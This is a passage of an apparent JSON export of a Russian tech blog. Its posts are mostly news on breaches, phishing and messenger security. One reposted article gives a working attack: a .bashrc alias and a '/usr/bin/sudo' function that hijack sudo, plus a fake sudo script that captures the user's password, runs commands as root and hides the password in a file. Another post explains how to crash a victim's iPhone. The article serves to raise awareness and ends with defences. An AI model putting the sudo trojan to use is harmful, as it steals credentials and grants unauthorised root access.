			"body": "Вдруг кому пригодится в повседневной и не повседневной жизни. \nНебольшое видео о режиме windows server core\n\n<video width=\"640\" height=\"360\" controls=\"controls\" preload=\"none\" poster=\"http://i.imgur.com/cs1wncY.png\">\n  <source src=\"https://sec.ch9.ms/ch9/17f7/27d2efdc-95b3-402f-af4c-c160eff517f7/TechDays1092_640_640_mid.mp4\"\n          type='video/mp4;codecs=\"avc1.42E01E, mp4a.40.2\"'/>\n</video>\n"
		},
		{
			"post_id": 44,
			"title": "Так ли безопасно использование абсолютного пути в *nix системах, как мы привыкли считать?",
			"date_published": 1487766505.988,
			"body": "![](https://hsto.org/files/09a/ac9/248/09aac9248df64701981053cff2ea62cf.png)\n\n[habrahabr.ru](https://habrahabr.ru/company/bizone/blog/322220/)\n---\nИдея редактирования переменных окружения пользователя для повышения прав при тестировании на проникновение стара как мир. По этой теме написано множество статей, и даже в книгах начали появляться советы по использованию абсолютного пути вместо относительного. Вот пример такого совета из довольно известной книги *Unix и Linux. Руководство системного администратора (4 издание)*:\n\n>…\n>Рекомендуем взять за правило при вводе команды указывать полное имя, >например /bin/su или /usr/bin/su, а не просто su. Это послужит определенной >защитой от тех программ с именем su, которые преднамеренно были >прописаны в переменной среды path злоумышленником, намеревавшимся >собрать хороший “урожай” паролей.\n>…\n\n\nНо так ли это безопасно? Если вы тоже задавались этим вопросом, то добро пожаловать под кат.\n\n\nДавайте по порядку. Допустим, мы попали на *nix сервер под учетной записью пользователя с ограниченными правами. Мы хотим получить права рута, но паролей мы не знаем. Допустим, мы перепробовали все стандартные способы повышения прав через ошибки в конфигурациях и различные эксплойты под ядро, но всё безрезультатно. Казалось бы, вариантов не осталось. Однако, если пользователь есть в группе sudo, то можно попробовать провернуть один трюк.\n\nИдея заключается в том, что на большинстве *nix машин используется sudo для временного повышения прав. При использовании sudo пользователю требуется ввести его текущий пароль. Следовательно, знание пароля пользователя с доступом к sudo даёт нам рута.\n\nПочти все современные *nix сервера используют bash или zsh в качестве стандартной командной оболочки. У них есть файлы конфигов (например, .bashrc для bash), которые хранятся в домашней директории. С их помощью можно изменить в командной оболочке почти всё. По умолчанию они имеют права 644 (-rw-r--r--), следовательно, владелец может их редактировать без особых проблем.\n\nСуть заключается в том, что командные оболочки имеют alias`ы, с помощью которых можно укорачивать команды.\n\nНапример, стандартный alias из .bashrc:\n```\nalias ll='ls -alF'\n```\nПри вызове ll на самом деле будет вызываться ls –alF. Аналогично мы можем поступить с sudo:\n```\nalias sudo='echo PWNED'\n```\nПосле этого выполнение команды sudo по относительному пути будет вызывать то, что мы указали в alias`е.\n\n![](https://habrastorage.org/files/530/8cc/981/5308cc9814654890b5fa5a6178f53349.png)\n\nИспользовать слеши в alias нельзя, поэтому абсолютный путь действительно является безопасным решением в данном случае. Так же абсолютный путь спасёт в случае редактирования переменной окружения PATH.\n\nА теперь рассмотрим случай, в котором абсолютный путь не спасёт. В конфигурация можно создавать функции, которые работают аналогично alias`ам за исключением того, что в их именах можно использовать слеши:\n```\nfunction /usr/bin/sudo() {\n        echo PWNED\n}\n```\nТеперь вызов /usr/bin/sudo будет тоже выполнять наш код.\n\n![](https://habrastorage.org/files/055/833/90d/05583390d77f4d2faca23a7d336026e9.png)\n\nСледующий этап – написание скрипта, который будет вести себя аналогично sudo (спрашивать пароль и повышать права пользователя), но одновременно с этим перехватывать пароль пользователя и выполнять произвольный код с правами администратора.\n\nВ конце концов, мы получим исполнение нашего скрипта при попытке вызвать sudo через абсолютный или относительный путь.\n\nДля начала пишем код ядовитого sudo:\n```\n#!/bin/bash\n\necho -n \"[sudo] password for $LOGNAME: \"\nread -s password\necho\n\ncommand='whoami'\n\neval \"echo -e $password | sudo -S --prompt='' $command\"\neval \"echo -e $password | sudo -S --prompt='' $*\"\n```\nОн спрашивает пароль пользователя в стиле sudo, после чего сохраняет его в переменную, выполняет наш код с повышенными правами и затем выполняет то, что хотел пользователь.\nТеперь прячем его в какую-нибудь неприметную папку (например ~/.local) и выставляем на него +x права на исполнение (chmod +x sudo). Имя файла нам, по сути, безразлично, так что лучше его тоже назвать как-нибудь неприметно (например, .config).\n\nС помощью read -s password мы считываем пароль в переменную $password.\nВ переменной command='whoami' содержится команда, которую мы будем выполнять с повышенными правами.\n\nКонструкция echo -e $password | sudo -S в данном случае используется для того, чтобы передать нашу переменную с паролем $password в sudo через stdin.\n\n--prompt='' нужно для того, чтобы реальное sudo не выводило сообщение о просьбе ввода пароля, когда мы к ней обратимся, иначе это будет выглядеть несколько подозрительно.\n\nТеперь нужно найти полный путь до sudo с помощью whereis. Например, /usr/bin/sudo. Поправим .bashrc так, чтобы команды sudo и /usr/bin/sudo запускали наш скрипт. Для этого нужно записать в .bashrc (куда-нибудь в центр для неприметности) следующий код, который следует отредактировать под себя:\n```\nalias sudo='~/.local/.config'\nfunction /usr/bin/sudo() {\n        eval \"~/.local/.config $*\"\n}\n```\nПроверяем:\n\n![](https://habrastorage.org/files/9c7/93b/816/9c793b816cf24fc9ac1871188222b92b.png)\n\nПрофит. Теперь попробуем сохранить пароль пользователя в файл. Для этого заменим текущую команду.\n```\ncommand=\"echo $password > ~/.local/.1\"\n```\nПробуем:\n\n![](https://habrastorage.org/files/e4a/00f/90b/e4a00f90b6e14a75a54cf04b7b782b5b.png)\n\nВсё получилось. qwerty123 и есть пароль пользователя. Остаётся еще множество частных случаев, при которых наш скрипт может повести себя некорректно. Например, sudo su или sudo --help. Поскольку в этой статье мы рассматриваем только возможность реализации подобной атаки, то процесс доведения её до блеска я перекладываю на плечи читателя.\n\nТеперь вы знаете, что использование абсолютного пути в *nix системах не так уж безопасно.\n\nА теперь главный вопрос: как же защититься от возможной атаки? На мой взгляд, оптимальным вариантом будет разрешить редактирование .bashrc только из под root`а. Конечно, есть второй вариант, но он менее удобный и безопасный: постоянно проверять целостность конфигов.\n\nСпасибо за внимание :)"
		},
		{
			"post_id": 43,
			"title": "winswitch полезная тулза",
			"date_published": 1487452394.008,
			"body": "Программа, позволяющая запускать приложение на одной системе (Linux, FreeBSD, Mac OS) и на другой (Linux, FreeBSD, Mac OS, Windows, Solaris, Android) работать с этой программой в отдельном окне. Есть графический интерфейс, нажатием кнопки в котором можно отправить открытую локально программу на другую систему, где она сама откроется в отдельном окне. Можно через клиент выбирать из списка запущенных на другом хосте программ.\n\n[сайт проги](http://winswitch.org)\n\n[взято отсюда](https://vk.com/wall-33847957_158391)"
		},
		{
			"post_id": 42,
			"title": "Тысячи сайтов темной паутины – Dark Web – оказались недоступны из-за атаки",
			"date_published": 1487448241.954,
			"body": "Она вывела из строя до 20% всего анонимного интернета\n\nВ результате кибератаки на хостинг Freedom Hosting II в пятницу тысячи сайтов темной паутины были выведены из строя и оставались неработоспособными как минимум до конца понедельника.\n\nТемной паутиной называют сеть серверов, построенных на защищенной программной платформе Tor, обеспечивающей анонимность участников. Этой сетью пользуются многие общественные активисты, лица, желающие скрыть свою личность, а также преступники, распространяющие запрещенный контент вроде детской порнографии и средств для осуществления кибератак. Так, онлайновая торговая площадка Silk Road использовала серверы темной паутины, желая избежать преследования со стороны правоохранителей, но в 2013 г. была ликвидирована федеральными властями США в результате уголовного расследования.\n---\nПо словам независимого исследователя Сары Джейми Льюис, ранее работавшей инженером по безопасности в Amazon.com, атака вывела из строя около 20% всех сайтов темной паутины. Организаторы атаки затем опубликовали информацию из баз данных на серверах Freedom Hosting II. Льюис отмечает, что Freedom Hosting II был крупнейшим хостингом анонимных сайтов. В числе прочего хакеры опубликовали переписку участников форумов, посвященных детской порнографии, а также коды для серверов, управлявших взломанной сетью.\n\nДругой независимый исследователь, Крис Монтейро, проанализировавший опубликованные хакерами данные с Freedom Hosting II, также обнаружил в них материалы, связанные с детской порнографией, и идентификаторы и пароли пользователей. Еще один исследователь, Трой Хант, отмечает, что среди этих материалов были обсуждения порнографического контента, но собственно порнографические изображения оттуда были удалены. «Сайты такого рода по понятным причинам заинтересованы в сохранении анонимности», – говорит Хант. Пока неясно, кто управляет хостингом Freedom Hosting II, информации о его владельцах в публичном доступе нет.\n\nХотя анонимная система Tor приспособлена для сокрытия личности и местоположения пользователей, частные сообщения, передаваемые в сети Freedom Hosting II, могут содержать данные, которые позволяют установить личности участников обмена, в том числе телефонные номера и адреса электронной почты. В сервисах же вроде Gmail не применяются «анонимайзеры» (средства для скрытия информации о пользователе). Правоохранители могут использовать эти данные в ходе расследований, вместе с тем нарушение работы столь крупного хостинг-провайдера может и помешать уже начатым расследованиям, поскольку нарушители закона, вероятно, поспешат перенести свою деятельность на другую онлайн-площадку. ФБР в понедельник отказалось комментировать ситуацию.\n\nЛица, называющие себя организаторами атаки на Freedom Hosting II, сообщают свой адрес электронной почты, но отказываются предоставить информацию о себе. Льюис отмечает, что, хотя атакой были затронуты около 10 000 сайтов, большинство из них не использовались активно. Многие сайты содержали анонимные блоги, посвященные политике.\n\n// Перевел Александр Силонов\n// http://www.vedomosti.ru/technology/articles/2017/02/09/676782-temnoi-pautini\n\n[источник](http://127.0.0.1:43110/1GQkPB8mFgxH7GQQbkNPJtvRaZZpVi65u1/?Post:8:%D0%A2%D1%8B%D1%81%D1%8F%D1%87%D0%B8+%D1%81%D0%B0%D0%B9%D1%82%D0%BE%D0%B2+%D1%82%D0%B5%D0%BC%D0%BD%D0%BE%D0%B9+%D0%BF%D0%B0%D1%83%D1%82%D0%B8%D0%BD%D1%8B+%E2%80%93+Dark+Web+%E2%80%93+%D0%BE%D0%BA%D0%B0%D0%B7%D0%B0%D0%BB%D0%B8%D1%81%D1%8C+%D0%BD%D0%B5%D0%B4%D0%BE%D1%81%D1%82%D1%83%D0%BF%D0%BD%D1%8B+%D0%B8%D0%B7-%D0%B7%D0%B0+%D0%B0%D1%82%D0%B0%D0%BA%D0%B8)"
		},
		{
			"post_id": 41,
			"title": "Git в Tor",
			"date_published": 1486596226.667,
			"body": "[gitor](http://gitorbgpelb6ktnt.onion/)"
		},
		{
			"post_id": 40,
			"title": "Полиция убила программиста на глазах у жены и детей",
			"date_published": 1486595416.501,
			"body": "Полицией убит Сэм Мэлони, 35-летний программист и отец двоих детей, создатель и разработчик ядра MORPHiS, системы для распределённого хранения данных и шифрованного общения, он также изобрёл DPUSH (DMAIL), децентрализованный, свободно распространяемый протокол обмена сообщениями, основанный на Proof-of-Work. Полицейские расстреляли его в его собственном доме. Сэм верил, что его изобретения помогут масштабировать и развивать Биткойн.\n---\nОн был идеалистом и работал над достижением цели “безкоррупционной демократии”. Для Сэма, главной целью было создание утопического мира, в котором нет нужды в “неизбежном зле” и где массовый шпионаж правительств за каждым жителем невозможен. Его план работы над Интернетом Доверия состоял в создании этой утопии, которую он назвал проектом Атлантида, вдохновлённый книгой Айн Рэнд “Атлант расправил плечи”.\nОдин из проектов Сэма - [https://morph.is](https://morph.is/) Morphis - глобальное децентрализованное хранилище зашифрованных данных, предназначенное для замены облачных технологий. Первый релиз включает DMail: децентрализованный мессенджер не поддающийся цензуре, защищенный от спама.\nhttp://london.ctvnews.ca/wife-of-man-shot-dead-by-london-police-speaks-out-1.3243183\nhttps://bitnovosti.com/2017/02/07/sam-maloney-killed-in-a-police-raid-in-canada/\n\nРепозиторий: http://redmine.morph.is/redmine/projects/morphis/repository\n\n\nSOURCE\nDownload the MORPHiS source with open source GNU GPL v2 license\n\nRedmine Public Repository View\ngit clone gitpub@162.252.242.77:morphis.git\n\n( ECDSA: 15:c6:aa:a1:df:1e:f2:8a:97:35:8a:9c:42:bd:ef:23 )\n( RSA: 80:b9:fe:c8:ce:f4:4f:9d:83:9b:a8:a6:0d:de:e6:d2 )\n( http: git url: http://162.252.242.77:8000/morphis.git )\n\n[взято из ZeroTalkRU](http://127.0.0.1:43110/1Apr5ba6u9Nz6eFASmFrefGvyBKkM76QgE/?Topic:1_1789XcRxNBxCsCTWFhhGsbmjrmg4XX4QPL)"
		},
		{
			"post_id": 39,
			"title": "dd if=... of=... status=progress",
			"date_published": 1485632352.143,
			"body": ">>\ndd - это утилита для копирования данных из файла в файл. очень старая и очень удобная. надо тебе затереть MBR запись на винчестере\n```dd if=/dev/zero of=/dev/sdX bs=512 count=1```\nнадо тебе iso-шку на флешку записать\n```dd if=UbuntuZverEdition.iso of=/dev/sdx bs=1M```\nнадо тебе вычитать 2Мб данных из файла начиная с 2Кб\n```dd if=input.file bs=1K count=2048 skip=2```\nи так далее. как без рук короче. только раньше неудобно было следить за прогрессом. надо было мне например перед шифрованием веник на 500GB рендомными данными заполнить, на скорости 180Мб/сек это займет не меньше часа. а интересно же знать, сколько осталось еще, не падает ли скорость и вообще все ли хорошо - раньше я бы отправил сигнал USR1 процессу dd:\n```pkill -USR1 dd```\nи он бы вывел статистику. но это не очень удобно и теперь уже совсем не нужно, потому что его можно запускать с параметром ```status=progress``` и видеть прогресс не отправляя никаких сигналов. яснопонятно?\n>>\n\n\n[честно скоммунизжено отсюда](http://diasporaaqmjixh5.onion/posts/8638564#3b4fe0c0c5e50134282f782bcb452bd5)\n\n\n"
		},
		{
			"post_id": 38,
			"title": "Коллекция готовых образов для VirtualBox (с моими дополнениями)",
			"date_published": 1485513809.078,
			"body": "Полный список под катом\n---\n\n<center>**GNU/Linux (GNU userland tools running on top of the Linux kernel)**</center>\n\nArchlinux (website).\nCentOS (website): the installation is done from the DVD, with default parameters set\nDamn Small Linux (website): the installation is done from the CD, with default parameters set.\nDebian (website): the installation has been done from the netinstall ISO image for the x86 architecture.\nDeLi Linux (website).\nDreamlinux: the installation has been done from the CD, with default parameters set.\nFedora (website).\nFluxbuntu (website): the installation is done from the CD, with default parameters set.\nGentoo (website): the installation is done from the ISO image, then customized .\ngNewSense (website): the installation is done from the CD, with default parameters set.\ngOS (website).\nKubuntu (website): the installation is done from the CD, with default parameters set.\nLinuxMint (website): the installation is done from the CD, with default parameter set.\nLubuntu (website): the installation is done from the CD, with default parameter set.\nMandriva (website): the installation is done from the CD, with default parameters set.\nManjaro (website): the installation is done from the CD, with default parameters set.\nMoblin 2 (website): the installation is done from the .img/.iso file provided by the project.\nmoonOS (website).\nOpenSUSE (website).\nPCLinuxOS (website).\nPuppy Linux (website).\nSidux (website).\nSlackware (website): the installation has been done from the first CD, selecting the bare minimum disk sets.\nSliTaz (website)\nTiny Core Linux (website)\nTinyMe (website)\nUbuntu (website): the installation is done from the CD, with default parameters set.\nUbuntu Server (website): the installation is done from the CD.\nUbuntu Studio (website): the installation is done from the CD, with default parameters set\nXubuntu (website): the installation is done from the CD, with default parameters set.\nVectorLinux (website):the installation is done from the CD, with default parameters set.\nZenwalk (website): the installation is done from the Standard Edition CD, with default parameters set.\n\n<center>**GNU/OpenSolaris (GNU userland tools running on top of the OpenSolaris kernel)**</center>\nOpenSolaris (website).\nNexenta (website): the installation is done from the CD.\nMILAX(website): the installation has been done from the official ISO image.\n\n<center>**GNU/FreeBSD (GNU userland tools running on top of the FreeBSD kernel)**</center>\n\nDebian GNU/kFreeBSD (website): the installation has been done from the daily mini.iso.\n\n<center>**BSD**</center>\n\nFreeBSD (website):the installation is done from the bootonly iso\n\n<center>**Other**</center>\n\nAROS (website): the installation has been done from the nightly build ISO image.\nFreeDOS (website): the installation has been done from the official ISO image.\nHaiku (website): the image has been done from the nightly build HDD raw image.\nMINIX (website): the installation has been done from the official ISO image (MINIX 3).\nReactOS (website): the installation has been done from the official ISO image.\nSYLLABLE (website): the installation has been done from the official ISO image.\nAndroid-x86 (website): the istallation has been done from the daily ISO image.\nPlan 9 (website): the installation has been done from the ISO image.\n\n[ссылка на сайт](https://virtualboxes.org/images/)"
		},
		{
			"post_id": 37,
			"title": "IE разных версий в готовых образах от MS",
			"date_published": 1485507481.081,
			"body": "На тот случай если нужен IE от 8 до Edge, то мелкософт подготовил готовые образы.\n\n[IE разных версий в готовых образах от MS](https://developer.microsoft.com/en-us/microsoft-edge/tools/vms/)"
		},
		{
			"post_id": 36,
			"title": "On-line трансляция полярного сияния на Шпицбергене!",
			"date_published": 1485462796.343,
			"body": "\nМожно смотреть онлайн видео: http://kho.unis.no/kho_asc_live.htm\n\n![](http://158.39.49.147/mjpg/video.mjpg)"
		},
		{
			"post_id": 35,
			"title": "Разведопрос: Алексей Балаганский про основы информационной безопасности",
			"date_published": 1485169259.414,
			"body": "<iframe width=\"854\" height=\"480\" src=\"https://www.youtube.com/embed/Yb7CjQBQ9XE\" frameborder=\"0\" allowfullscreen></iframe>"
		},
		{
			"post_id": 34,
			"title": "Простой сервис для определения своего IP",
			"date_published": 1485129009.818,
			"body": "http://l2.io/ip.js?var=myip\n\n\n"
		},
		{
			"post_id": 32,
			"title": "Как работать с чужим кодом",
			"date_published": 1485124191.234,
			"body": "<iframe width=\"854\" height=\"480\" src=\"https://www.youtube.com/embed/pzVTV4v3mU8\" frameborder=\"0\" allowfullscreen></iframe>"
		},
		{
			"post_id": 30,
			"title": "Чужой iPhone можно «убить», отправив единственное сообщение. Видео",
			"date_published": 1484754884.476,
			"body": "Отправив на iPhone или iPad сообщение с тремя определенными символами, можно вызвать сбой в работе устройства. Сообщение должно иметь вид файла контактов или заметки. Аппарат зависнет, когда попытается объединить символы в один эмодзи.\n---\n***В iOS найдена уязвимость***\n\nВ iOS обнаружена уязвимость, которая дает возможность человеку без особых хакерских навыков вызвать зависание выбранного им iPhone или iPad. Для этого на устройство жертвы достаточно отправить сообщение, содержащее три определенных символа.\n\nУязвимость была обнаружена исследователем кибербезопасности под никнеймом Preston159. Способ применения описал в своем блоге пользователь YouTube EverythingApplePro. Он сообщил, что данную уязвимость имеют все версии iOS от 10.0 до 10.2.1.\n\n***Вредоносное сообщение***\n\nВредоносное сообщение должно содержать три символа: один текстовый и два эмодзи: флаг, ноль и радуга. iMessage попытается скомпоновать их в один символ – радужный флаг. Это вызывает сбой в работе устройства и, как результат, его зависание.\n\nДело в том, что эмодзи «радужный флаг» тоже есть в наборе Apple. Он создается путем объединения эмодзи «флаг» и «радуга». Команду их объединить дает символ VS16 (вариативный сектор 16), расположенный между ними. На самом деле вредоносная последовательность символов выглядит так: флаг, VS16, ноль, радуга. iPhone видит флаг и радугу, понимает, что должен объединить их в один эмодзи, но пытается добавить в этот же символ еще и ноль, что приводит к зависанию.\n\n![](http://filearchive.cnews.ru/img/news/2017/01/18/iphone600.jpg)\niPhone зависнет, когда попытается объединить флаг, ноль и радугу в радужный флаг\n\n***Как отправить сообщение***\n\nЧтобы отправить на устройство жертвы вредоносное сообщение, злоумышленнику достаточно пройти по ссылке https://www.vincedes3.com/TextCrash.html и загрузить с нее вложение на свой iPhone. Вложение представляет собой файл контакта из адресной книги, который нужно сохранить в приложении iCloud Drive. С помощью функции «Поделиться» в этом же приложении, файл следует отправить жертве через iMessage. Способ подходит для версии iOS 10.2.1.\n\n<iframe width=\"854\" height=\"480\" src=\"https://www.youtube.com/embed/G0iPhSuiMpk\" frameborder=\"0\" allowfullscreen></iframe>\n\nСуществует и другой вариант отправки сообщения, описанный пользователем Preston159. Для этого нужно копировать и вставить нужную последовательность символов на Mac и сохранить ее как заметку в приложении Notes или на iCloud.com. Там ее можно будет найти уже с iPhone, чтобы копировать и отправить жертве. Метод работает на версии iOS 10.1.1.\n\n***Как возобновить работу***\n\nКогда жертва получит и просмотрит сообщение, ее устройство зависнет. Восстановить его работу, просто закрыв вредоносное сообщение, невозможно.\n\nЧтобы iPhone заработал, нужно пройти по ссылке https://vincedes3.com/save.html в браузере Safari. Это восстановит нормальную работу приложения для обмена сообщениями. Способ «оживления» устройства был придуман самим исследователем, обнаружившим уязвимость."
		},
		{
			"post_id": 29,
			"title": "Стоило подумать о blockchain сертификатах, как они уже реализованы. EmcSSL",
			"date_published": 1484749597.12,
			"body": "https://emcssl.emercoin.com/ \n\n>emcSSL - Decentralized distributed login system\n>\n>This is emcSSL support site. You can download emcSSL certificate generation >toolkit for Window or Unix-like system or source of test suite (this is server part >sample also) here:\n>\n>Certificate generation toolkit for Windows\n>Certificate generation toolkit for Unix-like OS\n>emcSSL site package\n>Recent development version available on [GitHub](https://github.com/emercoin/emcssl)\n>Test your emcssl certificate and InfoCard with any echo test program:\n>\n>InfoCard.php - echo using mmcFE modules (source here)\n>emcSSLecho.php - echo without any modules (source here)\n>Note: By default, emcssl scripts generates certificate with ECDSA signature. >However, some OSes (for instance MacOS 10.10.5) cannot work with ECDSA, >and you unable upload this certificate to Safari or Chrome on MacOS (details). >If so, you can generate old style RSA certificate by using optional paremeter 2 >in gen_crt.sh: \n>$ ./gen_crt.sh your_template.tpl RSA\n>\n>Where is used emcSSL:\n>\n>EmerCoin mining pool\n>EmerCoin online wallet\n>Drupal CMS module\n>Drupal-based blog about Technologies and Security\n>\n\n"
		},
		{
			"post_id": 28,
			"title": "Против пользователей Gmail развернута хитроумная фишинговая кампания",
			"date_published": 1484730691.327,
			"body": "Хотя о потенциальной опасности писем, полученных из непроверенных источников, в наше время известно всем, фишинг по-прежнему остается одной из излюбленных методик хакеров. Но прогресс не стоит на месте, и злоумышленники изобретают все новые и новые способы обведения пользователей вокруг пальца.\n---\nНа этот раз эксперты обратили внимание на новую фишинговую кампанию, направленную против пользователей Gmail. Письма содержат настолько хорошо завуалированные вредоносные ссылки, что даже продвинутые пользователи часто не замечают подвоха и вводят свои учетные данные на фишинговом аналоге Gmail. Как только жертва скомпрометирована, злоумышленники немедленно перехватывают доступ над ее аккаунтом и атакуют все контакты пострадавшего.\n\nВредоносные письма, идущие от скомпрометированных пользователей, якобы содержат PDF-документ, который можно предварительно просмотреть прямо в веб-интерфейсе почты. Однако кликнув на такое «вложение», которое на самом деле является простым встроенным в письмо изображением,  пользователь инициирует переадресацию на фишинговую страницу.\n\nФишинговый URL начинается с «data:text/html,https://accounts/google.com», что может ввести пользователя в заблуждение, заставив поверить, что он все еще находится на настоящем сайте Google.  На самом деле, для открытия фишинговой страницы в новой вкладке используется специальный [скрипт](https://gist.github.com/timruffles/5c76d2b61c88188e77f6#gistcomment-1968194), а страница не имеет никакого отношения к Google.\n\n![](https://xakep.ru/wp-content/uploads/2017/01/Gmail_phishing-610x415.png)\n\nДанный метод атак [известен](http://blog.greggman.com/blog/getting-phished/) экспертам уже несколько месяцев, но лишь недавно злоумышленники стали захватывать скомпрометированные аккаунты практически моментально. Пока не совсем ясно, автоматизирован этот процесс, или преступники просто очень оперативно реагируют на получение новых учетных данных.Похоже, атакующие действуют вручную, так как в одном случае школьный системный администратор [рассказал](https://news.ycombinator.com/item?id=13373327), что хакеры взяли за основу фишинговых посланий легитимные письма из почтового ящика жертвы.\n\nПодробный анализ данной схемы атак был [опубликован](https://www.wordfence.com/blog/2017/01/gmail-phishing-data-uri/) Марком Маундером (Mark Maunder), главой и основателем компании Wordfence. Он предупреждает, что данная техника имеет очень большой процент поражения целей. Эксперт рекомендует включать двухфакторную аутентификацию и сохранять бдительность, внимательно проверяя URL в адресной строке.\n\n[xakep](https://xakep.ru/2017/01/16/gmail-phishing/)"
		},
		{
			"post_id": 27,
			"title": "Взломан израильский разработчик ПО для взлома смартфонов Cellebrite",
			"date_published": 1484398192.081,
			"body": "![](https://habrastorage.org/getpro/geektimes/post_images/699/34b/8da/69934b8dafeb4b54f70045f365dc04bd.jpg)\nЛиор Бен-Перец (Leeor Ben-Peretz), исполнительный вице-президент фирмы Cellebrite. Фото: Jack Guez/AFP/Getty Image\n\nХакеров опять хакнули. Такова судьба компаний, которые сотрудничают с правоохранительными органами и разведывательными агентствами. Если уходишь на ту сторону баррикад — готовься к худшему.\n---\nМы помним, [какому публичному унижению](https://habrahabr.ru/company/eset/blog/261887/) подверглась хакерская группа Hacking Team, которая специализируется на разработке и продаже шпионского ПО для правоохранительных органов и спецслужб различных государств. В сеть утекла личная переписка Hacking Team с клиентами, заключённые договора на продажу киберизделий различным государствам, а также большое количество другой информации. В 2014 году хакеры также [взломали Gamma International](https://habrahabr.ru/post/234331/), разработчика шпионских программ FinFisher.\n\nТеперь похожая беда случилась с их коллегами из компании [Cellebrite](https://www.cellebrite.com/), которая разрабатывает софт для криминалистической экспертизы (взлома) мобильных телефонов. Израильская компания не гнушалась сотрудничать с авторитарными политическими режимами, за что её и наказали.\n\nОсновной продукт Cellebrite — программно-аппаратный комплекс Universal Forensic Extraction Device (UFED) для взлома и копирования данных с любых мобильных телефонов. Он продаётся в формате планшета ([UFED Touch2](https://www.cellebrite.com/Mobile-Forensics/Products/ufed-touch2)), или софт устанавливается на персональный компьютер ([UFED 4PC](https://www.cellebrite.com/Mobile-Forensics/Products/ufed-4pc))\n\n![](https://habrastorage.org/files/5ab/870/50f/5ab87050f7ce478390ed91b07e7c93c0.jpg)\nВерсия UFED для полевых операций (UFED TK)\n\nДля сравнения, у компании «Элкомсофт», российского разработчика ПО для брутфорса паролей и криминалистической экспертизы, есть программное обеспечение [ElcomSoft Password Recovery Bundle](https://www.elcomsoft.ru/eprb.html) (855995 руб.) и набор для взлома мобильных телефонов [Elcomsoft Mobile Forensic Bundle](https://www.elcomsoft.ru/emfb.html) — чисто программное решение. У израильских коллег ассортимент красивее, хотя по функциональности не обязательно превосходит российский.\n\nИТ-издание Motheboard три недели назад опубликовало [серию материалов](http://motherboard.vice.com/cellebrite-phone-crackers) о деятельности компании Cellebrite. Оно обнаружило, что с этой фирмой сотрудничает американская полиция. Последняя разместила у неё [заказов на миллионы долларов](http://motherboard.vice.com/read/us-state-police-have-spent-millions-on-israeli-phone-cracking-tech-cellebrite). Полиция заказывала специальное оборудование и программы для взлома телефонов. С их помощью «копы» подбирали пинкоды, восстанавливали удалённые сообщения и контакты на телефонах. \n\n![](https://habrastorage.org/files/640/da3/437/640da34375f94d008e64b76f406b1c7d.jpg)\n\nОбычно такие инструменты используются для сбора улик после конфискации мобильного телефона у подозреваемых. Но оказалось, что Cellebrite сотрудничает с [недемократическими странами](https://theintercept.com/2016/12/08/phone-cracking-cellebrite-software-used-to-prosecute-tortured-dissident/), где власти используют хакерские инструменты против политической оппозиции. \n\nГоворили, что инструменты Cellebrite штатно используют агенты ФБР для быстрого и скрытного копирования памяти телефонов подозреваемых.\n\nОснованная в 1999 году, сейчас компания выросла до крупных размеров, её контролирует японский инвестор, у фирмы открыты офисы по всей территории США, а среди клиентов — правоохранительные органы многих стран.\n\nТеперь разработчик инструментов для взлома и сам подвергся взлому. В очередной статье Motherboard пишет, что в её распоряжение попал [архив с 900 Гб](http://motherboard.vice.com/read/hacker-steals-900-gb-of-cellebrite-data) файлов, полученных с серверов Cellebrite.\n\nПока что информация не опубликована в открытом доступе, но можно рассчитывать, что рано или поздно это случится, как и в случае с Hacking Team. Тогда мы и проверим, насколько честный бизнес ведёт Cellebrite.\n\nВ изъятых файлах — списки клиентов, базы данных и большой объём технической информации о продуктах Cellebrite. Первоначальный анализ данных о клиентах Cellebrite показывает, что среди её клиентов могут быть правоохранительные структуры из стран с [авторитарными режимами](https://motherboard.vice.com/read/cellebrite-sold-phone-hacking-tech-to-repressive-regimes-data-suggests), таких как Россия, ОАЭ и Турция. В частности, в службе технической поддержки Cellebrite обнаружено письмо из прокуратуры РФ.\n\nЕсли информация подтвердится, то это даёт возможность предположить, что компания Cellebrite способствовала нарушениям прав человека в этих странах — ради получения прибыли. Эти данные могут быть правдивы. Кстати, у Cellebrite есть даже версия сайта на русском языке.\n\nСреди данных есть кэш веб-сервера с именами и паролями пользователей, которые логинились на домен my.cellebrite. [Этот раздел сайта](https://cellevault.cellebrite.com/cas/login?service=https://my.cellebrite.com/j_spring_cas_security_check) предназначен только для клиентов компании.\n\nПосле публикации статей в издании Motherboard компания Cellebrite [официально признала](http://www.cellebrite.com/Mobile-Forensics/News-Events/Press-Releases/cellebrite-statement-on-information-security-breach) факт взлома «внешнего веб-сервера» с резервной базой данных аккаунтов my.cellebrite.сom. По этому поводу сейчас проводится расследование. \n\nКомпания уверяет клиентов, что в утечке данных нет ничего особо конфиденциального, только хэши паролей пользователей, которые ещё не мигрировали на новую систему учёта пользовательских аккаунтов.\n\nТем временем, аккаунтами Cellebrite начали торговать в некоторых IRC-чатах, сказал хакер в комментарии Motherboard. «Я не могу сказать многое о том, что было сделано. Одно дело припугнуть их, а совсем другое дело — подвесить за яйца и сфотографировать», — добавил он.\n\nОпределённо, разработчикам программного обеспечения следует тщательно выбирать клиентов.\n\n[geektimes](https://geektimes.ru/post/284596/)"
		},
		{
			"post_id": 26,
			"title": "Сообщения в WhatsApp могут прочитать посторонние. И это не собираются исправлять",
			"date_published": 1484392213.119,
			"body": "![](https://meduza.io/image/attachments/images/001/787/887/large/t7-W3cXa2xL2OJps7IDG2Q.jpg) \nМессенджером WhatsApp пользуется миллиард человек. На сайте сервиса [утверждается](https://www.whatsapp.com/faq/ru/general/28030015): никто не прочитает ваши сообщения, кроме адресата. Как выяснил исследователь из Калифорнийского университета в Беркли Тобиас Бёлтер, это не так. Злоумышленники или спецслужбы могут получить доступ к переписке, несмотря на шифрование. «Медуза» рассказывает, как это возможно.\n---\nWhatsApp [ввел сквозное шифрование сообщений](https://meduza.io/news/2016/04/05/whatsapp-vvel-polnoe-shifrovanie-dlya-vseh-vidov-soobscheniy) в апреле 2016 года. Это означает, что сообщения зашифровываются и расшифровываются непосредственно на телефоне. Чтобы система работала, приложение создает пользователю ключ для шифрования; такой же есть у каждого собеседника. В идеале, нужно лично убедиться, что ключ действительно принадлежит собеседнику (хотя, конечно, так делают далеко не все). Дальше мы расскажем, как это работает в WhatsApp на примере.\n\nАлиса решила поздравить Боба с днем рождения, но не хочет, чтобы послание прочитали сотрудники ФСБ. За два дня до праздника Алиса встречается с Бобом. Девушка открывает WhatsApp и сканирует QR-код на телефоне друга. Теперь Алиса уверена: ключ шифрования принадлежит Бобу, и никто, кроме него, не сможет прочесть 